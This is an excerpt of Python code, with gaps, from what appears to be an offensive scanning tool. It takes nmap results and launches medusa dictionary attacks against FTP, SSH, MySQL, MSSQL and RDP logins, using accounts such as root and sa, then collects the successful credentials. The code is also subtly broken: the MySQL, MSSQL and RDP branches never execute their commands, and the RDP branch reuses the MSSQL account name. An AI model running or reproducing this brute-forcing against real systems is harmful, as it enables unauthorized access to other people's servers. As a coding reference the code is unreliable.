...
def single_portBruteCrack_scan(target):
    ...
    def portBruteCrack(ip,nmapResultString):
        ...
        if re.search("Discovered open port 21/tcp",nmapResultString,re.I):
            cmd="medusa -h %s -U %s -P %s -t 5 -O /tmp/medusaResult -M ftp" % (ip,ModulePath+"/dicts/user.txt",ModulePath+"dicts/pass.txt")
            os.system(cmd)
        ...
        if re.search("Discovered open port 22/tcp",nmapResultString,re.I):
            cmd="medusa -h %s -u root -P %s -t 5 -O /tmp/medusaResult -M ssh" % (ip,ModulePath+"dicts/pass.txt")
            os.system(cmd)
            with open("/tmp/medusaResult","r+") as f:
                content=f.read()
            if re.search(r"success",content,re.I):
        ...
        if re.search("Discovered open port 3306/tcp",nmapResultString,re.I):
            cmd="medusa -h %s -u root -P %s -t 5 -O /tmp/medusaResult -M mysql" % (ip,ModulePath+"dicts/pass.txt")
            with open("/tmp/medusaResult","r+") as f:
                content=f.read()
            if re.search(r"success",content,re.I):
                returnString+=content
        ...
        if re.search("Discovered open port 1433/tcp",nmapResultString,re.I):
            cmd="medusa -h %s -u sa -P %s -t 5 -O /tmp/medusaResult -M mssql" % (ip,ModulePath+"dicts/pass.txt")
            with open("/tmp/medusaResult","r+") as f:
                content=f.read()
            if re.search(r"success",content,re.I):
                returnString+=content
        ...
        if re.search("Discovered open port 3389/tcp",nmapResultString,re.I):
            cmd="medusa -h %s -u sa -P %s -t 5 -O /tmp/medusaResult -M rdp" % (ip,ModulePath+"dicts/pass.txt")
            with open("/tmp/medusaResult","r+") as f:
                content=f.read()
            if re.search(r"success",content,re.I):
                returnString+=content
